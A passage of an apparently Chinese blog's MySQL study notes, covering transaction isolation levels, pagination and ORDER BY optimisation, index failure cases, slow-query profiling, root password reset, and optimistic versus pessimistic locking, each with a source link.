class="line"><span class="comment">// 8.事务提交</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;commit();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 9.事务回滚</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;rollback();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10.查看数据https://learnku.com/articles/33749</span></span><br><span class="line"></span><br><span class="line">$mysqli-&gt;query(<span class="string">"select * from user"</span>);</span><br><span class="line">READ COMMITTED（提交读），大多数数据库系统的默认隔离级别，一个事务开始时，只能 “看见” 已经提交的事务所做的修改，一个事务从开始直到提交之前，所做的任何修改对其他事务都是不可见的，也叫不可重复读（nonrepeatable read），有可能出现幻读（Phantom Read），指的是当某个事务在读取某个范围内的记录时，另外一个事务又在该范围内插入了新的记录，当之前的事务再次读取该范围的记录时，会产生幻行（Phantom Row）</span><br><span class="line"></span><br><span class="line">REPEATABLE READ（可重复读），通过 InnoDB 和 XtraDB 存储引擎，是 MySQL 的默认事务隔离级别，该级别保证了在同一个事物中多次读取同样记录的结果是一致的。解决了脏读，又通过多版本并发控制 mvcc 解决了幻读。https:<span class="comment">//learnku.com/articles/32336</span></span><br><span class="line">https:<span class="comment">//www.qqdeveloper.com/2019/08/18/MySQl%E4%BA%8B%E5%8A%A1%E6%9C%80%E5%85%A8%E8%AF%A6%E8%A7%A3/</span></span><br><span class="line">read uncommitted | 读未提交</span><br><span class="line">read committed | 读已提交</span><br><span class="line">repeatable read | 可重复读</span><br><span class="line">serializable | 串行化</span><br><span class="line">事务 A 读取了事务 B 更新的数据，然后事务 B 在某些因素下执行了回滚，那么事务 A 读取的数据就是不合理的，即脏数据。</span><br><span class="line">事务 A 需要重复多次读取某组数据，事务 A 在事务 B 对该组数据修改提交前后进行读取，很显然、两次读取的数据是不一致的，即不可重复读。侧重于元数据的修改。</span><br><span class="line">事务 A 在修改每一条元数据的时候，事务 B 在此时添加了一条新记录，事务 A 在处理的过程中突然多了一条数据，即幻读。侧重于数据的删除与修改。隔离级别越高，越能保证数据的完整性和一致性，但是对并发性能的影响也越大。</span><br><span class="line">                                                                        事务隔离级别为读提交时，写数据只会锁住相应的行</span><br><span class="line">                                                                        事务隔离级别为串行化时，读写数据都会锁住整张表</span><br><span class="line">   https:<span class="comment">//learnku.com/articles/24581                                                                     </span></span><br><span class="line">    不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表 https:<span class="comment">//learnku.com/articles/30933</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL大小写不敏感问题"><a href="#MySQL大小写不敏感问题" class="headerlink" title="MySQL大小写不敏感问题"></a>MySQL大小写不敏感问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">show create table t3\G</span><br><span class="line">*************************** <span class="number">1.</span> row ***************************</span><br><span class="line">       Table: t3</span><br><span class="line">Create Table: CREATE TABLE <span class="string">`t3`</span> (</span><br><span class="line">  <span class="string">`a`</span> varchar(<span class="number">20</span>) CHARACTER SET utf8 COLLATE utf8_bin DEFAULT NULL,</span><br><span class="line">  <span class="string">`b`</span> varchar(<span class="number">20</span>) DEFAULT NULL</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line">a列有个校验规则为collate utf8_bin的设置，这个就是在a列上查询可以区分大小写的原因。 </span><br><span class="line"></span><br><span class="line">可以通过show collation命令查看有哪些校验规则：</span><br><span class="line"></span><br><span class="line">mysql&gt; show collation like <span class="string">'utf8%'</span>;</span><br><span class="line">通过show character set查看有哪些字符集：</span><br><span class="line"></span><br><span class="line">mysql&gt; show character set like <span class="string">'utf8%'</span>;</span><br><span class="line">可以看到utf8的默认校验规则是utf8general_ci，想要设置在某一列上查询区分大小写，可能通过对列指定collate utf8_bin来解决。</span><br><span class="line">https:<span class="comment">//www.daemoncoder.com/a/MySQL%E5%A4%A7%E5%B0%8F%E5%86%99%E4%B8%8D%E6%95%8F%E6%84%9F%E9%97%AE%E9%A2%98/4e413d3d</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL分页offset过大性能问题与优化"><a href="#MySQL分页offset过大性能问题与优化" class="headerlink" title="MySQL分页offset过大性能问题与优化"></a>MySQL分页offset过大性能问题与优化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SELECT b FROM t WHERE c&lt;<span class="number">1000</span> LIMIT <span class="number">2000000</span>, <span class="number">500</span></span><br><span class="line">可以看到这个一个分页查询，从位置<span class="number">2000000</span>处开始，取<span class="number">500</span>条数据，问题的原因正是这个过大的分页起点导致。mysql分页查询会并不是直接跳过前<span class="number">2000000</span>再取出<span class="number">500</span>条数据，而是把前<span class="number">2000000</span>条和后面的<span class="number">500</span>条都取出来，再把前<span class="number">2000000</span>条抛弃，这样的话，上面的慢查询相当于从表中取<span class="number">2000500</span>条数据，这么大的数据量必然会慢。</span><br><span class="line"></span><br><span class="line">解决方案</span><br><span class="line"></span><br><span class="line">sql修改为：</span><br><span class="line"></span><br><span class="line">SELECT b FROM (SELECT a FROM t WHERE c&lt;<span class="number">1000</span> LIMIT <span class="number">2000000</span>, <span class="number">500</span>) ta INNER JOIN t tb ON ta.a = tb.a</span><br><span class="line">这种方式先用一个子查询表的主键（还是和原来一样带有过大分页），结果做为一个临时表，再和原来的t表JOIN，查出需要的字段。</span><br><span class="line"></span><br><span class="line">这种方式不仔细看的话，也是要查出<span class="number">2000500</span>条数据，因为子任务的where和limit设置和原来一样，关键就在于子任务SELECT出来的是a字段（t表的主键），而不是像原来直接b字段，这样查出<span class="number">500</span>条数据后再和原有的表join再查出需要的数据字段b，下面详细分析下这个细节带来的性能差异。</span><br><span class="line"></span><br><span class="line">基础知识：innodb的索引分为聚集索引和辅助索引，innodb是用聚集索引组织数据的，辅助索引上只存了一个主键，按辅助索引查询数据时，先从辅助索引对应记录的主键，再用主键去聚集索引查具体的数据字段。（这里不详细分析两个种索引的区别，不了解可以自行百度）</span><br><span class="line"></span><br><span class="line">上面的慢sql会从辅助索上查<span class="number">2000500</span>条数据，对于每一条数据还要从聚集索引上查一次。修改后的sql会从辅助索引上查出<span class="number">2000500</span>条主键，由于辅助索引上本身就有主键，所以这<span class="number">2000500</span>无需再去聚集索引查，生成临时表后再把这<span class="number">500</span>条数据去聚集索引查出b字段，sql从聚集索引中查<span class="number">2000500</span>条数据变成了只需要查<span class="number">500</span>条，并且b字段在真实的情况往往是大量数据的字段，因此修改前后的sql性能差别很大（这里我理解修改前的sql按辅助索引顺序查询时，再去查聚集索引就不再是顺序读了，而是随机的离散读，也是一部分性能差的原因，具体只是自己的猜测，没有验证）。</span><br><span class="line">https:<span class="comment">//www.daemoncoder.com/a/MySQL%E5%88%86%E9%A1%B5offset%E8%BF%87%E5%A4%A7%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E4%B8%8E%E4%BC%98%E5%8C%96/4d513d3d</span></span><br></pre></td></tr></table></figure>
<h3 id="MySQL-反向模糊查找"><a href="#MySQL-反向模糊查找" class="headerlink" title="MySQL 反向模糊查找"></a>MySQL 反向模糊查找</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">假如数据库我们只存一条记录, 不管用户输入, 大卫还是大卫王我们都会回复它同一个内容.这时候我们只需要反向模糊查找即可</span><br><span class="line">表数据如下</span><br><span class="line">id     keyword      reply</span><br><span class="line"><span class="number">1</span>      %大卫%       他就是大卫</span><br><span class="line">select * <span class="keyword">from</span> table_name where <span class="string">'大卫'</span> like keyword</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.shiguopeng.cn/archives/379</span></span><br></pre></td></tr></table></figure>
<h3 id="大表分页查询调研"><a href="#大表分页查询调研" class="headerlink" title="大表分页查询调研"></a>大表分页查询调研</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; explain select * <span class="keyword">from</span> user_status_record_1 order by id limit <span class="number">5000000</span>,<span class="number">5</span>;</span><br><span class="line">+----+-------------+----------------------+-------+---------------+---------+---------+------+---------+-------+</span><br><span class="line">| id | select_type | table                | type  | possible_keys | key     | key_len | ref  | rows    | Extra |</span><br><span class="line">+----+-------------+----------------------+-------+---------------+---------+---------+------+---------+-------+</span><br><span class="line">|  <span class="number">1</span> | SIMPLE      | user_status_record_1 | index | NULL          | PRIMARY | <span class="number">8</span>       | NULL | <span class="number">5000005</span> |       |</span><br><span class="line">+----+-------------+----------------------+-------+---------------+---------+---------+------+---------+-------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; explain SELECT * FROM anti_health_rate_43 WHERE id &gt;=(select id <span class="keyword">from</span> anti_health_rate_43 limit <span class="number">2000010</span>, <span class="number">1</span>) limit <span class="number">5</span>;</span><br><span class="line">+----+-------------+---------------------+-------+---------------+----------------+---------+------+---------+-------------+</span><br><span class="line">| id | select_type | table               | type  | possible_keys | key            | key_len | ref  | rows    | Extra       |</span><br><span class="line">+----+-------------+---------------------+-------+---------------+----------------+---------+------+---------+-------------+</span><br><span class="line">|  <span class="number">1</span> | PRIMARY     | anti_health_rate_43 | range | PRIMARY       | PRIMARY        | <span class="number">8</span>       | NULL | <span class="number">1779770</span> | Using where |</span><br><span class="line">|  <span class="number">2</span> | SUBQUERY    | anti_health_rate_43 | index | NULL          | idx_create_day | <span class="number">4</span>       | NULL | <span class="number">3559541</span> | Using index |</span><br><span class="line">+----+-------------+---------------------+-------+---------------+----------------+---------+------+---------+-------------+</span><br><span class="line"><span class="number">2</span> rows <span class="keyword">in</span> set (<span class="number">0.27</span> sec)</span><br><span class="line">$ret = select id <span class="keyword">from</span> table order by aaa limit <span class="number">100</span>,<span class="number">10</span></span><br><span class="line">select * <span class="keyword">from</span> table where id <span class="keyword">in</span> ( $ret );</span><br><span class="line">https:<span class="comment">//bettercuicui.github.io/2018/04/01/MYSQL/%E5%A4%A7%E8%A1%A8%E5%88%86%E9%A1%B5%E6%9F%A5%E8%AF%A2%E8%B0%83%E7%A0%94/</span></span><br></pre></td></tr></table></figure>
<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">先把root的旧密码置空</span><br><span class="line">use mysql;</span><br><span class="line">update user set authentication_string=<span class="string">''</span> where user=<span class="string">'root'</span>;</span><br><span class="line">备注：Mysql5<span class="number">.7</span>+ password字段 已改成 authentication_string字段</span><br><span class="line">重置成新密码</span><br><span class="line">alter user <span class="string">'root'</span>@<span class="string">'localhost'</span> identified by <span class="string">'newpassword'</span>;</span><br><span class="line">备注：Mysql8<span class="number">.0</span>修改密码方式已有变化（此处是个坑，需要注意）</span><br><span class="line">Mysql8<span class="number">.0</span>之前：</span><br><span class="line">update user set password=password(<span class="string">'root'</span>) where user=<span class="string">'root'</span>;</span><br><span class="line">mysql -uroot -proot</span><br><span class="line">https:<span class="comment">//learnku.com/articles/38466  https://learnku.com/articles/38455</span></span><br></pre></td></tr></table></figure>
<h3 id="Orderby-排序优化"><a href="#Orderby-排序优化" class="headerlink" title="Orderby 排序优化"></a>Orderby 排序优化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Create Table: CREATE TABLE <span class="string">`user`</span> (</span><br><span class="line"><span class="string">`id`</span> int(<span class="number">10</span>) unsigned NOT NULL AUTO_INCREMENT,</span><br><span class="line"><span class="string">`name`</span> varchar(<span class="number">20</span>) NOT NULL,</span><br><span class="line"><span class="string">`age`</span> int(<span class="number">10</span>) NOT NULL DEFAULT <span class="string">'0'</span>,</span><br><span class="line"><span class="string">`city`</span> varchar(<span class="number">20</span>) NOT NULL,</span><br><span class="line"><span class="string">`addr`</span> varchar(<span class="number">50</span>) DEFAULT NULL,</span><br><span class="line">PRIMARY KEY (<span class="string">`id`</span>),</span><br><span class="line">KEY <span class="string">`idx_name_age_city`</span> (<span class="string">`name`</span>,<span class="string">`age`</span>,<span class="string">`city`</span>)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line"></span><br><span class="line">order by 能使用索引最左前缀</span><br><span class="line">* select id,name,age,city <span class="keyword">from</span> user order by name;</span><br><span class="line">* select id,name,age,city <span class="keyword">from</span> user order by name,age,city;</span><br><span class="line">* explain select id,name,age,city <span class="keyword">from</span> user order by name desc,age desc,city desc</span><br><span class="line">如果 where 使用索引的最左前缀定义为常量，则 order by 能使用索引</span><br><span class="line">* select * <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> order by age,city;</span><br><span class="line">* select * <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> and age = <span class="number">20</span> order by city;</span><br><span class="line">* select * <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> and age &gt; <span class="number">20</span> order by age,city;</span><br><span class="line"></span><br><span class="line">不能使用索引进行排序</span><br><span class="line">select * <span class="keyword">from</span> user order by name,age,city;<span class="comment">//query*字段</span></span><br><span class="line">select * <span class="keyword">from</span> user order by addr;<span class="comment">//非索引字段排序</span></span><br><span class="line">select * <span class="keyword">from</span> user order by name,addr;<span class="comment">//含有非索引字段</span></span><br><span class="line">select * <span class="keyword">from</span> user where age = <span class="number">20</span> order by city;<span class="comment">//跳过了name字段，违反最左前缀法则</span></span><br><span class="line">select * <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> order by city;<span class="comment">//跳过了age字段，违反最左前缀法则</span></span><br><span class="line">select * <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> order by age,addr;<span class="comment">//含有非索引字段</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/38925</span></span><br></pre></td></tr></table></figure>
<h3 id="更新同一个表不同字段"><a href="#更新同一个表不同字段" class="headerlink" title="更新同一个表不同字段"></a>更新同一个表不同字段</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update diag_product_list_ios <span class="keyword">as</span> a join (select soft_package_id,soft_name <span class="keyword">from</span> diag_product_list_ios where pdt_code=<span class="string">'ThinkDiag'</span> ) <span class="keyword">as</span> b on a.soft_package_id=b.soft_package_id set a.soft_name=b.soft_name where a.pdt_code=<span class="string">'EASYDIAG4'</span> and a.soft_name is <span class="literal">null</span></span><br></pre></td></tr></table></figure>
<h3 id="慢查询分析调优工具"><a href="#慢查询分析调优工具" class="headerlink" title="慢查询分析调优工具"></a>慢查询分析调优工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">'profiling%'</span>;<span class="comment">//默认关闭，保存近15次的运行结果</span></span><br><span class="line">set profiling = on;</span><br><span class="line">show profiles;</span><br><span class="line">备注：</span><br><span class="line">show warnings;<span class="comment">//可以显示警告和报错的信息</span></span><br><span class="line">show profile cpu,block io <span class="keyword">for</span> query <span class="number">3</span>;</span><br><span class="line">通过Status一列，可以看到整条SQL的运行过程</span><br><span class="line">如出现以下一种或者几种情况，说明SQL执行性能极其低下，亟需优化</span><br><span class="line">* converting HEAP to MyISAM  <span class="comment">//查询结果太大，内存都不够用了往磁盘上搬了</span></span><br><span class="line">* Creating tmp table <span class="comment">//创建临时表：拷贝数据到临时表，用完再删</span></span><br><span class="line">* Copying to tmp table on disk <span class="comment">//把内存中临时表复制到磁盘，危险</span></span><br><span class="line">* locked <span class="comment">//出现死锁</span></span><br><span class="line">select * <span class="keyword">from</span> information_schema.profiling;</span><br><span class="line"></span><br><span class="line">记录sql到数据库（建议只在测试库环境进行）</span><br><span class="line"></span><br><span class="line">方式<span class="number">1</span>:命令行</span><br><span class="line"><span class="number">1.</span> set global general_log = <span class="number">1</span>;</span><br><span class="line"><span class="number">2.</span> set global log_output = <span class="string">'TABLE'</span>;</span><br><span class="line">方式<span class="number">2</span>:配置文件</span><br><span class="line">* vim my.cnf</span><br><span class="line">general_log =<span class="number">1</span></span><br><span class="line">general_log_file = <span class="regexp">/path/</span>logfile</span><br><span class="line">log_output = FILE</span><br><span class="line">* 重启MySQL服务</span><br><span class="line">诊断 SQL</span><br><span class="line">select * <span class="keyword">from</span> mysql.general_log;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/39087</span></span><br></pre></td></tr></table></figure>
<h3 id="慢查询分析调优工具-1"><a href="#慢查询分析调优工具-1" class="headerlink" title="慢查询分析调优工具"></a>慢查询分析调优工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">'%slow_query_log%'</span>;</span><br><span class="line">* slow_query_log <span class="comment">//是否开启，默认关闭，建议调优时才开启</span></span><br><span class="line">* slow_query_log_file <span class="comment">//慢查询日志存放目录</span></span><br><span class="line">set global slow_query_log =<span class="number">1</span>; <span class="comment">//只对当前会话生效，重启失效</span></span><br><span class="line">show variables like <span class="string">'long_query_time%'</span>;<span class="comment">//查看阀值（大于），默认10s</span></span><br><span class="line">set global long_query_time = <span class="number">3</span> <span class="comment">//设置慢查询阀值</span></span><br><span class="line">如何把未使用索引的 SQL 记录写入慢查询日志</span><br><span class="line">show variables like <span class="string">'log_queries_not_using_indexes'</span>; <span class="comment">//查看设置，默认关闭</span></span><br><span class="line">set global log_queries_not_using_indexes = on; <span class="comment">//设置</span></span><br><span class="line">select sleep(<span class="number">4</span>);<span class="comment">//睡眠4s再执行</span></span><br><span class="line">show global status like <span class="string">'%Slow_queries%'</span>;<span class="comment">//查看慢查询条数</span></span><br><span class="line">得到返回记录集最多的<span class="number">10</span>条SQL：</span><br><span class="line">mysqldumpslow -s r -t  <span class="number">10</span> /<span class="keyword">var</span>/lib/mysql/<span class="number">695</span>f5026f0f6-slow.log</span><br><span class="line">得到访问次数最多的<span class="number">10</span>条SQL：</span><br><span class="line">mysqldumpslow -s r -t  <span class="number">10</span> /<span class="keyword">var</span>/lib/mysql/<span class="number">695</span>f5026f0f6-slow.log</span><br><span class="line">得到按照时间排序的前<span class="number">10</span>条里面含有左连接的SQL：</span><br><span class="line">mysqldumpslow -s t -t <span class="number">10</span> -g <span class="string">"left join"</span> /<span class="keyword">var</span>/lib/mysql/<span class="number">695</span>f5026f0f6-slow.log</span><br><span class="line">也支持管道符命令</span><br><span class="line">mysqldumpslow -s t -t <span class="number">10</span> -g <span class="string">"left join"</span> /<span class="keyword">var</span>/lib/mysql/<span class="number">695</span>f5026f0f6-slow.log | more <span class="comment">//分页显示</span></span><br><span class="line"></span><br><span class="line">cat /<span class="keyword">var</span>/lib/mysql/<span class="number">695</span>f5026f0f6-slow.log <span class="comment">//查看慢查询日志</span></span><br><span class="line">-- 执行SQL时间</span><br><span class="line"># Time: 2019-12-31T05:54:23.893042Z</span><br><span class="line">-- 执行SQL的主机信息</span><br><span class="line"># User@Host: root[root] @ localhost []  Id:    40</span><br><span class="line">-- SQL的执行信息</span><br><span class="line"># Query_time: 4.013664  Lock_time: 0.000000 Rows_sent: 1  Rows_examined: 1</span><br><span class="line">-- SQL执行时间</span><br><span class="line">SET timestamp=<span class="number">1577771659</span>;</span><br><span class="line">-- SQL内容</span><br><span class="line">select sleep(<span class="number">4</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/39009</span></span><br></pre></td></tr></table></figure>
<h3 id="索引失效"><a href="#索引失效" class="headerlink" title="索引失效"></a>索引失效</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">explain select * <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> and age = <span class="number">20</span> and pos = <span class="string">'cxy'</span> and phone = <span class="string">'18730658760'</span>;</span><br><span class="line">如果索引有多列，要遵守最左前缀法则</span><br><span class="line">即查询从索引的最左前列开始并且不跳过索引中的列</span><br><span class="line">explain select * <span class="keyword">from</span> user where age = <span class="number">20</span> and phone = <span class="string">'18730658760'</span> and pos = <span class="string">'cxy'</span>;</span><br><span class="line">mysql在使用不等于（!=、&lt;&gt;）的时候无法使用索引会导致全表扫描（除覆盖索引外）</span><br><span class="line">explain select * <span class="keyword">from</span> user where age != <span class="number">20</span>;</span><br><span class="line">explain select * <span class="keyword">from</span> user where age &lt;&gt; <span class="number">20</span>;</span><br><span class="line">少用or</span><br><span class="line">explain select * <span class="keyword">from</span> user where name = <span class="string">'2000'</span> or age = <span class="number">20</span> or pos =<span class="string">'cxy'</span>;</span><br><span class="line">正常（索引参与了排序）</span><br><span class="line">explain select * <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> and age = <span class="number">20</span> order by age,pos;</span><br><span class="line">备注：索引有两个作用：排序和查找</span><br><span class="line">https:<span class="comment">//learnku.com/articles/38889</span></span><br><span class="line">导致额外的文件排序（会降低性能）</span><br><span class="line">explain select name,age <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> order by pos;<span class="comment">//违反最左前缀法则</span></span><br><span class="line">explain select name,age <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> order by pos,age;<span class="comment">//违反最左前缀法则</span></span><br><span class="line">explain select * <span class="keyword">from</span> user where name = <span class="string">'zhangsan'</span> and age = <span class="number">20</span> order by created_time,age;<span class="comment">//含非索引字段</span></span><br></pre></td></tr></table></figure>
<h3 id="布尔值来作为-Group-By-Raw-条件"><a href="#布尔值来作为-Group-By-Raw-条件" class="headerlink" title="布尔值来作为 Group By Raw 条件"></a>布尔值来作为 Group By Raw 条件</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如何根据「 <span class="number">2001</span> 年之前和 <span class="number">2001</span> 年之后出生」 的条件进行分组？这是代码:</span><br><span class="line"></span><br><span class="line">$results = User::select(\DB::raw(<span class="string">'YEAR(birth_date) &lt; 2001 as adult, COUNT(id) as amount'</span>))</span><br><span class="line">    -&gt;groupBy(\DB::raw(<span class="string">'YEAR(birth_date) &lt; 2001'</span>))</span><br><span class="line">    -&gt;get();</span><br><span class="line">看起来很奇怪，对吧？让我解释一下。条件年份 (出生日期)&lt;<span class="number">2001</span> 将返回两个值之一 真或假。换句话说，<span class="number">1</span> 或 <span class="number">0</span>。这正是我们需要分组的地方 —— 不管这个人是不是成年人。</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/39537#reply126312</span></span><br></pre></td></tr></table></figure>
<h3 id="悲观锁与乐观锁"><a href="#悲观锁与乐观锁" class="headerlink" title="悲观锁与乐观锁"></a>悲观锁与乐观锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE <span class="string">`order_stock`</span> (</span><br><span class="line">  <span class="string">`id`</span> int(<span class="number">11</span>) NOT NULL AUTO_INCREMENT COMMENT <span class="string">'ID'</span>,</span><br><span class="line">  <span class="string">`oid`</span> int(<span class="number">50</span>) NOT NULL COMMENT <span class="string">'商品ID'</span>,</span><br><span class="line">  <span class="string">`quantity`</span> int(<span class="number">20</span>) NOT NULL COMMENT <span class="string">'库存'</span>,</span><br><span class="line">  PRIMARY KEY (<span class="string">`id`</span>)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=<span class="number">2</span> DEFAULT CHARSET=utf8;</span><br><span class="line">“乐观锁🔒”认为拿锁的用户多半是会成功的，因此在进行完业务操作需要实际更新数据的最后一步再去拿一下锁就好。这样就可以避免使用数据库自身定义的行锁，可以避免死锁现象的产生。</span><br><span class="line"></span><br><span class="line">UPDATE order_stock SET quantity = quantity - <span class="number">1</span> WHERE oid = <span class="number">1</span> AND quantity - <span class="number">1</span> &gt; <span class="number">0</span>; </span><br><span class="line">乐观并发控制多数用于数据争用不大、冲突较少的环境中，这种环境中，偶尔回滚事务的成本会低于读取数据时锁定数据的成本，因此可以获得比其他并发控制方法更高的吞吐量。</span><br><span class="line">悲观锁采用了“一锁🔒二查🔍三更新”模式，就是采用数据库中自带 select ... for update 关键字进行对当前事务添加行级锁🔒，🧵先将要操作的数据进行锁上，之后执行对应查询数据并执行更新操作。</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">SELECT quantity FROM order_stock WHERE oid = <span class="number">1</span> FOR UPDATE;</span><br><span class="line">UPDATE order_stock SET quantity = <span class="number">2</span> WHERE oid = <span class="number">1</span>; </span><br><span class="line">COMMIT;</span><br><span class="line">MySQL还有个问题是select ... for update语句执行中所有扫描过的行都会被锁上，这一点很容易造成问题。因此如果在MySQL中用悲观锁务必要确定走了索引，而不是全表扫描。</span><br><span class="line">https:<span class="comment">//www.debuginn.cn/4579.html</span></span><br></pre></td></tr></table></figure>
